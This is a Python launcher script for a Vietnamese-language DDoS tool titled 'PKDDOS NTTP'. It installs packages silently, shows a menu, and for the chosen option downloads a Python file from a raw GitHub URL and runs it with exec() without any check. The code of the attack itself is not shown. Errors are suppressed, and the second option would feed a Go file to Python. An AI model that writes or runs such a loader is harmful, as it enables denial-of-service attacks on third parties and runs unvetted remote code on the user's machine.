import os
import sys
import re
import json
import random
from time import sleep
import threading
from time import strftime

try:
    import requests
    import pystyle
except ImportError:
    os.system('pip install requests && pip install bs4 && pip install pystyle && pip install clear && pip install strftime')

def banner():
    print(''' 
[38;2;255;0;255m''')

s = "\033[1;91m『\033[1;97m亗\033[1;91m』"
r = "\033[1;97m▶▶\033[1;92m"
sr = s+r+' '

def ra(a):
    for i in range(len(a)):
        sys.stdout.write(a[i])
        sys.stdout.flush()
    print()

def main():
    a = "\033[1;91m=\033[1;97m=" * 30
    for i in range(len(a)):
        sys.stdout.write(a[i])
        sys.stdout.flush()
        sleep(0.001)
    print()
    from pystyle import Box
    os.system('clear')
    banner()
    a = "\033[1;91m=\033[1;97m=" * 30
    for i in range(len(a)):
        sys.stdout.write(a[i])
        sys.stdout.flush()
        sleep(0.001)
    print()
    print("- - - - - - - - - - - PKDDOS NTTP - - - - - - - - - - - - -")
    print()
    print(sr+"Nhập [1] PKTOOL DDOS")
    print()
    a = "\033[1;91m=\033[1;97m=" * 30
    for i in range(len(a)):
        sys.stdout.write(a[i])
        sys.stdout.flush()
        sleep(0.001)
    print()
    abc = int(input(sr+"Nhập Số : "))
    a = "\033[1;91m=\033[1;97m=" * 30
    for i in range(len(a)):
        sys.stdout.write(a[i])
        sys.stdout.flush()
        sleep(0.001)
    print()

    try:
        if abc == 1:
            exec(requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pk.py").text)
        elif abc == 2:
            exec(requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pk1.go").text)
    except:
        pass

if __name__ == "__main__":
    main()
